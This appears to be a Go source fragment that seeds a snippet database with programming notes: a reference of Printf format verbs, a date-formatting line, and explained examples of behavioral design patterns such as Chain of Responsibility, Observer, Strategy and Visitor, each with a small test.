	create(db, "Printf formats\n(tags: printf print format)\n---\n\nvar i int\nvar f float32\nvar s string\nvar b bool\nvar c Car\n\nfmt.Printf(\"%v\\n\", i) //0\nfmt.Printf(\"%v\\n\", f) //0\nfmt.Printf(\"%v\\n\", s) //\nfmt.Printf(\"%v\\n\", b) //false\nfmt.Printf(\"%v\\n\", c) //{ 0}\n\nfmt.Printf(\"%+v\\n\", i) //0\nfmt.Printf(\"%+v\\n\", f) //0\nfmt.Printf(\"%+v\\n\", s) //\nfmt.Printf(\"%+v\\n\", b) //false\nfmt.Printf(\"%+v\\n\", c) //{Model: Speed:0}\n\nfmt.Printf(\"%#v\\n\", i) //0\nfmt.Printf(\"%#v\\n\", f) //0\nfmt.Printf(\"%#v\\n\", s) //\"\"\nfmt.Printf(\"%#v\\n\", b) //false\nfmt.Printf(\"%#v\\n\", c) //main.Car{Model:\"\", Speed:0}\n\nfmt.Printf(\"%T\\n\", i) //int\nfmt.Printf(\"%T\\n\", f) //float32\nfmt.Printf(\"%T\\n\", s) //string\nfmt.Printf(\"%T\\n\", b) //bool\nfmt.Printf(\"%T\\n\", c) //main.Car\n\nfmt.Printf(\"%%\\n\") //%\n\ni = 15\nf = 32.7\ns = \"Pri vet!\"\nb = true\nc = Car{\"Audi\", 200}\n\nfmt.Printf(\"%#v\\n\", i) //15\nfmt.Printf(\"%#v\\n\", f) //32.7\nfmt.Printf(\"%#v\\n\", s) //\"Pri vet!\"\nfmt.Printf(\"%#v\\n\", b) //true\nfmt.Printf(\"%#v\\n\", c) //main.Car{Model:\"Audi\", Speed:200}\n\nfmt.Printf(\"%b\\n\", i) //1111\nfmt.Printf(\"%c\\n\", i) //☼\nfmt.Printf(\"%d\\n\", i) //15\nfmt.Printf(\"%o\\n\", i) //17\nfmt.Printf(\"%O\\n\", i) //0o17\nfmt.Printf(\"%q\\n\", i) //'\\x0f'\nfmt.Printf(\"%x\\n\", i) //f\nfmt.Printf(\"%X\\n\", i) //F\nfmt.Printf(\"%U\\n\", i) //U+000F\n\nfmt.Printf(\"%b\\n\", f) //8572109p-18\nfmt.Printf(\"%e\\n\", f) //3.270000e+01\nfmt.Printf(\"%E\\n\", f) //3.270000E+01\nfmt.Printf(\"%f\\n\", f) //32.700001\nfmt.Printf(\"%F\\n\", f) //32.700001\nfmt.Printf(\"%g\\n\", f) //32.7\nfmt.Printf(\"%G\\n\", f) //32.7\nfmt.Printf(\"%x\\n\", f) //0x1.05999ap+05\nfmt.Printf(\"%X\\n\", f) //0X1.05999AP+05\nfmt.Printf(\"%9.2f\\n\", f) //\t32.70\n\nfmt.Printf(\"%s\\n\", s) //Pri vet!\nfmt.Printf(\"%q\\n\", s) //\"Pri vet!\"\nfmt.Printf(\"%q\\n\", \"abc\\tdef\\n\") //\"abc\\tdef\\n\"\nfmt.Printf(\"%x\\n\", s) //5072692076657421\nfmt.Printf(\"%X\\n\", s) //5072692076657421\nfmt.Printf(\"% X\\n\", s) //50 72 69 20 76 65 74 21\n\nfmt.Println(\"\\n=== Slice ===\")\n// pointer on 0-element\nfmt.Printf(\"%p\\n\", []int{1, 2, 3}) //0x11812274\n\nfmt.Println(\"\\n=== Sprintf ===\") //pointer\ns1 := fmt.Sprintf(\"%[3]*.[2]*[1]f\", 12.0, 2, 6)\ns2 := fmt.Sprintf(\"%6.2f\", 12.0)\nfmt.Println(s1, s2) // 12.00  12.00\ns3 := fmt.Sprintf(\"%d %d %#[1]x %#x\", 16, 17) \nfmt.Println(s3) //16 17 0x10 0x11\n\n// errors:\nWrong type or unknown verb: %!verb(type=value)\n\tPrintf(\"%d\", \"hi\"):        %!d(string=hi)\nToo many arguments: %!(EXTRA type=value)\n\tPrintf(\"hi\", \"guys\"):      hi%!(EXTRA string=guys)\nToo few arguments: %!verb(MISSING)\n\tPrintf(\"hi%d\"):            hi%!d(MISSING)\nNon-int for width or precision: %!(BADWIDTH) or %!(BADPREC)\n\tPrintf(\"%*s\", 4.5, \"hi\"):  %!(BADWIDTH)hi\n\tPrintf(\"%.*s\", 4.5, \"hi\"): %!(BADPREC)hi\nInvalid or invalid use of argument index: %!(BADINDEX)\n\tPrintf(\"%*[2]d\", 7):       %!d(BADINDEX)\n\tPrintf(\"%.[2]d\", 7):       %!d(BADINDEX)\nif a String method calls panic(\"bad\"), the resulting formatted message will look like\n\t%!s(PANIC=bad)")
	create(db, "Date to string\n(tags: date string)\n---\n\nfileName := fmt.Sprintf(\"data_%s.txt\", time.Now().Format(\"20060102_150405\"))")
	create(db, "Pattern Chain of responsibility\n(tags: pattern chain responsibility)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Chain Of Responsibility pattern refers to object-level behavioral patterns.\n\nThe Chain Of Responsibility pattern avoids binding a requestor object to a request receiver object, while giving multiple objects the chance to process the request. The recipients are chained, and the request is chained until it is processed by some object.\n\nIn essence, it is a chain of handlers that receive a request in turn, and then decide whether to process it or not. If the request is not processed, then it is forwarded further along the chain. If it is processed, then the pattern itself decides to pass it on or not. If the request is not processed by any handler, then it is simply lost.\n\nRequired for implementation:\n\n1. Basic abstract class Handler, which describes the interface of handlers in chains;\n2. The ConcreteHandlerA class, which implements the concrete handler A;\n3. The ConcreteHandlerB class, which implements the concrete handler B;\n4. The ConcreteHandlerC class, which implements a specific C handler;\n\nNote that instead of storing references to all the candidate recipients of the request, each sender stores a single reference to the beginning of the chain, and each recipient has a single reference to its successor, the subsequent element in the chain.\n\npackage chain_of_responsibility\n\n// Handler provides a handler interface.\ntype Handler interface {\n\tSendRequest(message int) string\n}\n// ConcreteHandlerA implements handler \"A\".\ntype ConcreteHandlerA struct {\n\tnext Handler\n}\n// SendRequest implementation.\nfunc (h *ConcreteHandlerA) SendRequest(message int) (result string) {\n  if message == 1 {\n    result = \"Im handler 1\"\n  } else if h.next != nil {\n    result = h.next.SendRequest(message)\n  }\n  return\n}\n// ConcreteHandlerB implements handler \"B\".\ntype ConcreteHandlerB struct {\n  next Handler\n}\n// SendRequest implementation.\nfunc (h *ConcreteHandlerB) SendRequest(message int) (result string) {\n  if message == 2 {\n    result = \"Im handler 2\"\n  } else if h.next != nil {\n    result = h.next.SendRequest(message)\n  }\n  return\n}\n// ConcreteHandlerC implements handler \"C\".\ntype ConcreteHandlerC struct {\n  next Handler\n}\n// SendRequest implementation.\nfunc (h *ConcreteHandlerC) SendRequest(message int) (result string) {\n  if message == 3 {\n    result = \"Im handler 3\"\n  } else if h.next != nil {\n    result = h.next.SendRequest(message)\n  }\n  return\n}\n\nfunc TestChainOfResponsibility(t *testing.T) {\n  expect := \"Im handler 2\"\n  handlers := &ConcreteHandlerA{\n    next: &ConcreteHandlerB{\n      next: &ConcreteHandlerC{},\n    },\n  }\n  result := handlers.SendRequest(2)\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Command\n(tags: pattern command)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Command pattern refers to object-level behavioral patterns.\n\nThe Command pattern allows you to represent a request as an object. It follows that a command is an object. Such requests, for example, can be queued, canceled, or resumed.\n\nIn this pattern, we operate with the following concepts:\nCommand - a request in the form of an object for execution;\nReceiver - a request receiver object that will process our command;\nInvoker is the requestor object.\n\nThe Command pattern decouples the object that initiates an operation from the object that knows how to perform it. The only thing the initiator needs to know is how to send the command.\n\nRequired for implementation:\n\n1. Basic abstract class Command describing the command interface;\n2. The ConcreteCommand class that implements the command;\n3. The Invoker class, which implements the initiator, writes the command and provokes its execution;\n4. The Receiver class, which implements the receiver and has a set of actions that the command can request;\n\nInvoker knows how to stack commands and initiate their execution by some event. By contacting Invoker, you can cancel the command while it is not completed.\n\nThe ConcreteCommand contains the requests to the Receiver that it must execute. In turn, Receiver contains only a set of Actions that are executed when they are called from the ConcreteCommand.\n\npackage command\n\n// Command provides a command interface.\ntype Command interface {\n  Execute() string\n}\n// ToggleOnCommand implements the Command interface.\ntype ToggleOnCommand struct {\n  receiver *Receiver\n}\n// Execute command.\nfunc (c *ToggleOnCommand) Execute() string {\n  return c.receiver.ToggleOn()\n}\n// ToggleOffCommand implements the Command interface.\ntype ToggleOffCommand struct {\n  receiver *Receiver\n}\n// Execute command.\nfunc (c *ToggleOffCommand) Execute() string {\n  return c.receiver.ToggleOff()\n}\n// Receiver implementation.\ntype Receiver struct {\n}\n// ToggleOn implementation.\nfunc (r *Receiver) ToggleOn() string {\n  return \"Toggle On\"\n}\n// ToggleOff implementation.\nfunc (r *Receiver) ToggleOff() string {\n  return \"Toggle Off\"\n}\n// Invoker implementation.\ntype Invoker struct {\n  commands []Command\n}\n// StoreCommand adds command.\nfunc (i *Invoker) StoreCommand(command Command) {\n  i.commands = append(i.commands, command)\n}\n// UnStoreCommand removes command.\nfunc (i *Invoker) UnStoreCommand() {\n  if len(i.commands) != 0 {\n    i.commands = i.commands[:len(i.commands)-1]\n  }\n}\n// Execute all commands.\nfunc (i *Invoker) Execute() string {\n  var result string\n  for _, command := range i.commands {\n    result += command.Execute() + \"\\n\"\n  }\n  return result\n}\n\nfunc TestCommand(t *testing.T) {\n  expect := \"Toggle On\\n\" +\n    \"Toggle Off\\n\"\n  invoker := &Invoker{}\n  receiver := &Receiver{}\n  invoker.StoreCommand(&ToggleOnCommand{receiver: receiver})\n  invoker.StoreCommand(&ToggleOffCommand{receiver: receiver})\n  result := invoker.Execute()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Iterator\n(tags: pattern iterator)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Iterator pattern refers to object-level behavioral patterns.\n\nThe Iterator pattern provides a mechanism for traversing collections of objects without exposing their internal representation.\n\nOften this pattern is used instead of an array of objects to not only provide access to elements, but also to provide some logic.\n\nIterator is a generic interface that allows you to implement arbitrary iteration logic.\n\nRequired for implementation:\n\n1. The Iterator interface describing a set of methods for accessing the collection;\n2. The ConcreteIterator class that implements the Iterator interface. Keeps track of the position of the current element while iterating over the collection (Aggregate) .;\n3. Interface Aggregate describing a set of methods for a collection of objects;\n4. The ConcreteAggregate class that implements the Aggregate interface and stores the elements of the collection.\n\npackage iterator\n\n// Iterator provides a iterator interface.\ntype Iterator interface {\n  Index() int\n  Value() interface{}\n  Has() bool\n  Next()\n  Prev()\n  Reset()\n  End()\n}\n// Aggregate provides a collection interface.\ntype Aggregate interface {\n  Iterator() Iterator\n}\n// BookIterator implements the Iterator interface.\ntype BookIterator struct {\n  shelf    *BookShelf\n  index    int\n  internal int\n}\n// Index returns current index\nfunc (i *BookIterator) Index() int {\n  return i.index\n}\n// Value returns current value\nfunc (i *BookIterator) Value() interface{} {\n  return i.shelf.Books[i.index]\n}\n// Has implementation.\nfunc (i *BookIterator) Has() bool {\n  if i.internal < 0 || i.internal >= len(i.shelf.Books) {\n    return false\n  }\n  return true\n}\n// Next goes to the next item.\nfunc (i *BookIterator) Next() {\n  i.internal++\n  if i.Has() {\n    i.index++\n  }\n}\n// Prev goes to the previous item.\nfunc (i *BookIterator) Prev() {\n  i.internal--\n  if i.Has() {\n    i.index--\n  }\n}\n// Reset resets iterator.\nfunc (i *BookIterator) Reset() {\n  i.index = 0\n  i.internal = 0\n}\n// End goes to the last item.\nfunc (i *BookIterator) End() {\n  i.index = len(i.shelf.Books) - 1\n  i.internal = i.index\n}\n// BookShelf implements the Aggregate interface.\ntype BookShelf struct {\n  Books []*Book\n}\n// Iterator creates and returns the iterator over the collection.\nfunc (b *BookShelf) Iterator() Iterator {\n  return &BookIterator{shelf: b}\n}\n// Add adds an item to the collection.\nfunc (b *BookShelf) Add(book *Book) {\n  b.Books = append(b.Books, book)\n}\n// Book implements a item of the collection.\ntype Book struct {\n  Name string\n}\n\nfunc TestIterator(t *testing.T) {\n  shelf := new(BookShelf)\n  books := []string{\"A\", \"B\", \"C\", \"D\", \"E\", \"F\"}\n  for _, book := range books {\n    shelf.Add(&Book{Name: book})\n  }\n  for iterator := shelf.Iterator(); iterator.Has(); iterator.Next() {\n    index, value := iterator.Index(), iterator.Value().(*Book)\n    if value.Name != books[index] {\n      t.Errorf(\"Expect Book.Name to %s, but %s\", books[index], value.Name)\n    }\n  }\n}")
	create(db, "Pattern Mediator\n(tags: pattern mediator)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Mediator pattern refers to object-level behavioral patterns.\n\nThe Mediator pattern provides a mediation object that hides the way many other peer objects interact. Mediator makes the system loosely coupled, eliminating the need for objects to refer to each other, which allows you to change the interaction between them independently.\n\nFor example, we have an intermediary between a bakery factory, a farmer and a distribution store. The intermediary relieves the farmer from interacting with the plant, which uses his raw materials, and the plant from interacting with the store, which receives the products for sale.\n\nRequired for implementation:\n\n1. Interface Mediator - a mediator describing the organization of the process of exchanging information between objects of the Colleague type;\n2. The ConcreteMediator class that implements the Mediator interface;\n3. The base abstract class Colleague is a colleague describing the organization of the process of interaction of colleague objects with an object of Mediator type;\n4. The ConcreteColleague class that implements the Colleague interface. Each peer object only knows about the mediator object. All peer objects exchange information only through an intermediary.\n\npackage mediator\n\n// Mediator provides a mediator interface.\ntype Mediator interface {\n  Notify(msg string)\n}\n// Тип ConcreteMediator, реализует посредника\ntype ConcreteMediator struct {\n  *Farmer\n  *Cannery\n  *Shop\n}\n// Notify implementation.\nfunc (m *ConcreteMediator) Notify(msg string) {\n  if msg == \"Farmer: Tomato complete...\" {\n    m.Cannery.AddMoney(-15000.00)\n    m.Farmer.AddMoney(15000.00)\n    m.Cannery.MakeKetchup(m.Farmer.GetTomato())\n  } else if msg == \"Cannery: Ketchup complete...\" {\n    m.Shop.AddMoney(-30000.00)\n    m.Cannery.AddMoney(30000.00)\n    m.Shop.SellKetchup(m.Cannery.GetKetchup())\n  }\n}\n// СonnectСolleagues connects all colleagues.\nfunc СonnectСolleagues(farmer *Farmer, cannery *Cannery, shop *Shop) {\n  mediator := &ConcreteMediator{\n    Farmer:  farmer,\n    Cannery: cannery,\n    Shop:    shop,\n  }\n  mediator.Farmer.SetMediator(mediator)\n  mediator.Cannery.SetMediator(mediator)\n  mediator.Shop.SetMediator(mediator)\n}\n// Farmer implements a Farmer colleague\ntype Farmer struct {\n  mediator Mediator\n  tomato   int\n  money    float64\n}\n// SetMediator sets mediator.\nfunc (f *Farmer) SetMediator(mediator Mediator) {\n  f.mediator = mediator\n}\n// AddMoney adds money.\nfunc (f *Farmer) AddMoney(m float64) {\n  f.money += m\n}\n// GrowTomato implementation.\nfunc (f *Farmer) GrowTomato(tomato int) {\n  f.tomato = tomato\n  f.money -= 7500.00\n  f.mediator.Notify(\"Farmer: Tomato complete...\")\n}\n// GetTomato returns tomatos.\nfunc (f *Farmer) GetTomato() int {\n  return f.tomato\n}\n// Cannery implements a Cannery colleague.\ntype Cannery struct {\n  mediator Mediator\n  ketchup  int\n  money    float64\n}\n// SetMediator sets mediator.\nfunc (c *Cannery) SetMediator(mediator Mediator) {\n  c.mediator = mediator\n}\n// AddMoney adds money.\nfunc (c *Cannery) AddMoney(m float64) {\n  c.money += m\n}\n// MakeKetchup implementation.\nfunc (c *Cannery) MakeKetchup(tomato int) {\n  c.ketchup = tomato\n  c.mediator.Notify(\"Cannery: Ketchup complete...\")\n}\n// GetKetchup returns ketchup.\nfunc (c *Cannery) GetKetchup() int {\n  return c.ketchup\n}\n// Shop implements a Shop colleague.\ntype Shop struct {\n  mediator Mediator\n  money    float64\n}\n// SetMediator sets mediator.\nfunc (s *Shop) SetMediator(mediator Mediator) {\n  s.mediator = mediator\n}\n// AddMoney adds money.\nfunc (s *Shop) AddMoney(m float64) {\n  s.money += m\n}\n// SellKetchup converts ketchup to money.\nfunc (s *Shop) SellKetchup(ketchup int) {\n  s.money = float64(ketchup) * 54.75\n}\n// GetMoney returns money.\nfunc (s *Shop) GetMoney() float64 {\n  return s.money\n}\n\nfunc TestMediator(t *testing.T) {\n  farmer := new(Farmer)\n  cannery := new(Cannery)\n  shop := new(Shop)\n  farmer.AddMoney(7500.00)\n  cannery.AddMoney(15000.00)\n  shop.AddMoney(30000.00)\n  СonnectСolleagues(farmer, cannery, shop)\n  // A farmer grows a 1000kg tomato\n  // and informs the mediator about the completion of his work.\n  // Next, the mediator sends the tomatoes to the cannery.\n  // After the cannery produces 1000 packs of ketchup,\n  // he informs the mediator about his delivery to the store.\n  farmer.GrowTomato(1000)\n  expect := float64(54750)\n  result := shop.GetMoney()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %f, but %f.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Memento\n(tags: pattern memento)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Memento pattern refers to object-level behavioral patterns.\n\nThe Memento pattern gets and stores its internal state outside of an object so that it can be restored to the same state later. If the client later needs to \"roll back\" the state of the original object, it passes the Memento back to the original object to restore it.\n\nThe pattern operates on three objects:\n\n1. The owner of the state (Originator);\n2. Keeper (Memento) - Stores the state of the object-owner of the Originator class;\n3. Caretaker - Responsible for the safety of the custodian object of the Memento class.\n\nRequired for implementation:\n\n1. The Originator class, which has some kind of changing state, and also it can create and accept keepers (Memento) of its state;\n2. The Memento class, implements the storage for the Originator state;\n3. The Caretaker class, receives and stores a Memento object until the owner needs it.\n\npackage memento\n// Originator implements a state master.\ntype Originator struct {\n  State string\n}\n// CreateMemento returns state storage.\nfunc (o *Originator) CreateMemento() *Memento {\n  return &Memento{state: o.State}\n}\n// SetMemento sets old state.\nfunc (o *Originator) SetMemento(memento *Memento) {\n  o.State = memento.GetState()\n}\n// Memento implements storage for the state of Originator\ntype Memento struct {\n  state string\n}\n// GetState returns state.\nfunc (m *Memento) GetState() string {\n  return m.state\n}\n// Caretaker keeps Memento until it is needed by Originator.\ntype Caretaker struct {\n  Memento *Memento\n}\n\nfunc TestMomento(t *testing.T) {\n  originator := new(Originator)\n  caretaker := new(Caretaker)\n  originator.State = \"On\"\n  caretaker.Memento = originator.CreateMemento()\n  originator.State = \"Off\"\n  originator.SetMemento(caretaker.Memento)\n  if originator.State != \"On\" {\n    t.Errorf(\"Expect State to %s, but %s\", originator.State, \"On\")\n  }\n}")
	create(db, "Pattern Observer\n(tags: pattern observer)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Observer pattern refers to object-level behavioral patterns.\n\nThe Observer pattern defines a one-to-many dependency between objects so that when the state of one object changes, all objects that depend on it are notified and automatically updated.\n\nThe main participants in the pattern are Subject and Observer.\n\nThere are two ways to receive notifications from the publisher:\n\n1. Pull method: After receiving a notification from the publisher, the subscriber must go to the publisher and retrieve (pull) the data himself.\n2. Push method: The publisher does not notify the subscriber of data updates, but independently delivers (pushes) the data to the subscriber.\n\nRequired for implementation:\n\n1. Abstract class Subject that defines the Publisher interface;\n2. The ConcreteSubject class, implements the Subject interface;\n3. An abstract class Observer that defines the general functionality of Subscribers;\n4. Class ConcreteObserver, implements Subscriber;\n\npackage observer\n\n// Publisher interface.\ntype Publisher interface {\n  Attach(observer Observer)\n  SetState(state string)\n  Notify()\n}\n// Observer provides a subscriber interface.\ntype Observer interface {\n  Update(state string)\n}\n// ConcretePublisher implements the Publisher interface.\ntype ConcretePublisher struct {\n  observers []Observer\n  state     string\n}\n// NewPublisher is the Publisher constructor.\nfunc NewPublisher() Publisher {\n  return &ConcretePublisher{}\n}\n// Attach a Observer\nfunc (s *ConcretePublisher) Attach(observer Observer) {\n  s.observers = append(s.observers, observer)\n}\n// SetState sets new state\nfunc (s *ConcretePublisher) SetState(state string) {\n  s.state = state\n}\n// Notify sends notifications to subscribers.\n// Push model.\nfunc (s *ConcretePublisher) Notify() {\n  for _, observer := range s.observers {\n    observer.Update(s.state)\n  }\n}\n// ConcreteObserver implements the Observer interface.\ntype ConcreteObserver struct {\n  state string\n}\n// Update set new state\nfunc (s *ConcreteObserver) Update(state string) {\n  s.state = state\n}\n\nfunc ExampleObserver() {\n  publisher := NewPublisher()\n  publisher.Attach(&ConcreteObserver{})\n  publisher.Attach(&ConcreteObserver{})\n  publisher.Attach(&ConcreteObserver{})\n  publisher.SetState(\"New State...\")\n  publisher.Notify()\n}")
	create(db, "Pattern State\n(tags: pattern state)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe State pattern refers to object-level behavioral patterns.\n\nThe State pattern allows an object to change its behavior based on internal state and is an object-oriented implementation of a state machine. The behavior of the object changes so much that it looks like the class of the object has changed.\n\nThe pattern should be applied when the behavior of an object depends on its state and it must change during program execution, provided that there are a lot of states and it is rather difficult to use conditional operators scattered throughout the code for this.\n\nRequired for implementation:\n\n1. The Context class is an object-oriented representation of a state machine;\n2. Abstract class State, which defines the interface of various states;\n3. Class ConcreteStateA, implements one of the behaviors associated with a specific state;\n4. The ConcreteStateB class implements one of the behaviors associated with a specific state.\n\npackage state\n\n// MobileAlertStater provides a common interface for various states.\ntype MobileAlertStater interface {\n  Alert() string\n}\n// MobileAlert implements an alert depending on its state.\ntype MobileAlert struct {\n  state MobileAlertStater\n}\n// Alert returns a alert string\nfunc (a *MobileAlert) Alert() string {\n  return a.state.Alert()\n}\n// SetState changes state\nfunc (a *MobileAlert) SetState(state MobileAlertStater) {\n  a.state = state\n}\n// NewMobileAlert is the MobileAlert constructor.\nfunc NewMobileAlert() *MobileAlert {\n  return &MobileAlert{state: &MobileAlertVibration{}}\n}\n// MobileAlertVibration implements vibration alert\ntype MobileAlertVibration struct {\n}\n// Alert returns a alert string\nfunc (a *MobileAlertVibration) Alert() string {\n  return \"Vrrr... Brrr... Vrrr...\"\n}\n// MobileAlertSong implements beep alert\ntype MobileAlertSong struct {\n}\n// Alert returns a alert string\nfunc (a *MobileAlertSong) Alert() string {\n  return \"Белые розы, Белые розы. Беззащитны шипы...\"\n}\n\nfunc TestState(t *testing.T) {\n  expect := \"Vrrr... Brrr... Vrrr...\" +\n    \"Vrrr... Brrr... Vrrr...\" +\n    \"Белые розы, Белые розы. Беззащитны шипы...\"\n  mobile := NewMobileAlert()\n  result := mobile.Alert()\n  result += mobile.Alert()\n  mobile.SetState(&MobileAlertSong{})\n  result += mobile.Alert()\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Strategy\n(tags: pattern strategy)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Strategy pattern refers to object-level behavioral patterns.\n\nThe Strategy pattern defines a set of algorithms that are similar in nature, encapsulates them in a separate class and makes them replaceable. The Strategy pattern allows algorithms to be substituted without the involvement of clients using these algorithms.\n\nRequired for implementation:\n\n1. The Context class, which is the context for the execution of a particular strategy;\n2. Abstract class Strategy, which defines the interface of various strategies;\n3. The ConcreteStrategyA class implements one of the strategies, which are algorithms aimed at achieving a specific goal;\n4. The ConcreteStrategyB class implements one of the strategies, which are algorithms aimed at achieving a specific goal.\n\npackage strategy\n\n// StrategySort provides an interface for sort algorithms.\ntype StrategySort interface {\n  Sort([]int)\n}\n// BubbleSort implements bubble sort algorithm.\ntype BubbleSort struct {\n}\n// Sort sorts data.\nfunc (s *BubbleSort) Sort(a []int) {\n  size := len(a)\n  if size < 2 {\n    return\n  }\n  for i := 0; i < size; i++ {\n    for j := size - 1; j >= i+1; j-- {\n      if a[j] < a[j-1] {\n        a[j], a[j-1] = a[j-1], a[j]\n      }\n    }\n  }\n}\n// InsertionSort implements insertion sort algorithm.\ntype InsertionSort struct {\n}\n// Sort sorts data.\nfunc (s *InsertionSort) Sort(a []int) {\n  size := len(a)\n  if size < 2 {\n    return\n  }\n  for i := 1; i < size; i++ {\n    var j int\n    var buff = a[i]\n    for j = i - 1; j >= 0; j-- {\n      if a[j] < buff {\n        break\n      }\n      a[j+1] = a[j]\n    }\n    a[j+1] = buff\n  }\n}\n// Context provides a context for execution of a strategy.\ntype Context struct {\n  strategy StrategySort\n}\n// Algorithm replaces strategies.\nfunc (c *Context) Algorithm(a StrategySort) {\n  c.strategy = a\n}\n// Sort sorts data according to the chosen strategy.\nfunc (c *Context) Sort(s []int) {\n  c.strategy.Sort(s)\n}\n\nfunc TestStrategy(t *testing.T) {\n  data1 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}\n  data2 := []int{8, 2, 6, 7, 1, 3, 9, 5, 4}\n  ctx := new(Context)\n  ctx.Algorithm(&BubbleSort{})\n  ctx.Sort(data1)\n  ctx.Algorithm(&InsertionSort{})\n  ctx.Sort(data2)\n  expect := \"1,2,3,4,5,6,7,8,9,\"\n  var result1 string\n  for _, val := range data1 {\n    result1 += strconv.Itoa(val) + \",\"\n  }\n  if result1 != expect {\n    t.Errorf(\"Expect result1 to equal %s, but %s.\\n\", expect, result1)\n  }\n  var result2 string\n  for _, val := range data2 {\n    result2 += strconv.Itoa(val) + \",\"\n  }\n  if result2 != expect {\n    t.Errorf(\"Expect result2 to equal %s, but %s.\\n\", expect, result2)\n  }\n}")
	create(db, "Pattern Template Method\n(tags: pattern template method)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Template Method pattern refers to class-level behavioral patterns.\n\nThe Template Method pattern forms the structure of the algorithm and allows derived classes to implement, override or override certain steps of the algorithm without changing the structure of the algorithm as a whole.\n\nThe designer decides which steps of the algorithm are immutable and which are mutable. An abstract base class implements standard immutable steps in the algorithm, and can provide a default implementation for mutable steps. Modifiable steps can be provided by the client of the component in concrete derived classes.\n\nRequired for implementation:\n\n1. An abstract class AbstractClass that implements the Template Method, which describes the order of actions;\n2. Class ConcreteClass, which implements mutable actions.\n\npackage template_method\n\n// QuotesInterface provides an interface for setting different quotes.\ntype QuotesInterface interface {\n  Open() string\n  Close() string\n}\n// Quotes implements a Template Method.\ntype Quotes struct {\n  QuotesInterface\n}\n// Quotes is the Template Method.\nfunc (q *Quotes) Quotes(str string) string {\n  return q.Open() + str + q.Close()\n}\n// NewQuotes is the Quotes constructor.\nfunc NewQuotes(qt QuotesInterface) *Quotes {\n  return &Quotes{qt}\n}\n// FrenchQuotes implements wrapping the string in French quotes.\ntype FrenchQuotes struct {\n}\n// Open sets opening quotes.\nfunc (q *FrenchQuotes) Open() string {\n  return \"«\"\n}\n// Close sets closing quotes.\nfunc (q *FrenchQuotes) Close() string {\n  return \"»\"\n}\n// GermanQuotes implements wrapping the string in German quotes.\ntype GermanQuotes struct {\n}\n// Open sets opening quotes.\nfunc (q *GermanQuotes) Open() string {\n  return \"„\"\n}\n// Close sets closing quotes.\nfunc (q *GermanQuotes) Close() string {\n  return \"“\"\n}\n\nfunc TestTemplateMethod(t *testing.T) {\n  expect := \"«Test String»\"\n  qt := NewQuotes(&FrenchQuotes{})\n  result := qt.Quotes(\"Test String\")\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
	create(db, "Pattern Visitor\n(tags: pattern visitor)\n---\n\nhttps://github.com/AlexanderGrom/go-patterns\n\nThe Visitor pattern refers to object-level behavioral patterns.\n\nThe Visitor pattern allows you to bypass a set of elements (objects) with heterogeneous interfaces, and also allows you to add a new method to an object class without changing the class of this object itself.\n\nRequired for implementation:\n\n1. Abstract class Visitor describing the visitor interface;\n2. The ConcreteVisitor class that implements a specific visitor. Implements methods to traverse a specific element;\n3. The ObjectStructure class, which implements the structure (collection) in which the elements to be traversed are stored;\n4. Abstract class Element, which implements the interface of structure elements;\n5. The ElementA class that implements the structure element;\n6. The ElementB class that implements the structure element.\n\npackage visitor\n\n// Visitor provides a visitor interface.\ntype Visitor interface {\n  VisitSushiBar(p *SushiBar) string\n  VisitPizzeria(p *Pizzeria) string\n  VisitBurgerBar(p *BurgerBar) string\n}\n// Place provides an interface for place that the visitor should visit.\ntype Place interface {\n  Accept(v Visitor) string\n}\n// People implements the Visitor interface.\ntype People struct {\n}\n// VisitSushiBar implements visit to SushiBar.\nfunc (v *People) VisitSushiBar(p *SushiBar) string {\n  return p.BuySushi()\n}\n// VisitPizzeria implements visit to Pizzeria.\nfunc (v *People) VisitPizzeria(p *Pizzeria) string {\n  return p.BuyPizza()\n}\n// VisitBurgerBar implements visit to BurgerBar.\nfunc (v *People) VisitBurgerBar(p *BurgerBar) string {\n  return p.BuyBurger()\n}\n// City implements a collection of places to visit.\ntype City struct {\n  places []Place\n}\n// Add appends Place to the collection.\nfunc (c *City) Add(p Place) {\n  c.places = append(c.places, p)\n}\n// Accept implements a visit to all places in the city.\nfunc (c *City) Accept(v Visitor) string {\n  var result string\n  for _, p := range c.places {\n    result += p.Accept(v)\n  }\n  return result\n}\n// SushiBar implements the Place interface.\ntype SushiBar struct {\n}\n// Accept implementation.\nfunc (s *SushiBar) Accept(v Visitor) string {\n  return v.VisitSushiBar(s)\n}\n// BuySushi implementation.\nfunc (s *SushiBar) BuySushi() string {\n  return \"Buy sushi...\"\n}\n// Pizzeria implements the Place interface.\ntype Pizzeria struct {\n}\n// Accept implementation.\nfunc (p *Pizzeria) Accept(v Visitor) string {\n  return v.VisitPizzeria(p)\n}\n// BuyPizza implementation.\nfunc (p *Pizzeria) BuyPizza() string {\n  return \"Buy pizza...\"\n}\n// BurgerBar implements the Place interface.\ntype BurgerBar struct {\n}\n// Accept implementation.\nfunc (b *BurgerBar) Accept(v Visitor) string {\n  return v.VisitBurgerBar(b)\n}\n// BuyBurger implementation.\nfunc (b *BurgerBar) BuyBurger() string {\n  return \"Buy burger...\"\n}\n\nfunc TestVisitor(t *testing.T) {\n  expect := \"Buy sushi...Buy pizza...Buy burger...\"\n  city := new(City)\n  city.Add(&SushiBar{})\n  city.Add(&Pizzeria{})\n  city.Add(&BurgerBar{})\n  result := city.Accept(&People{})\n  if result != expect {\n    t.Errorf(\"Expect result to equal %s, but %s.\\n\", expect, result)\n  }\n}")
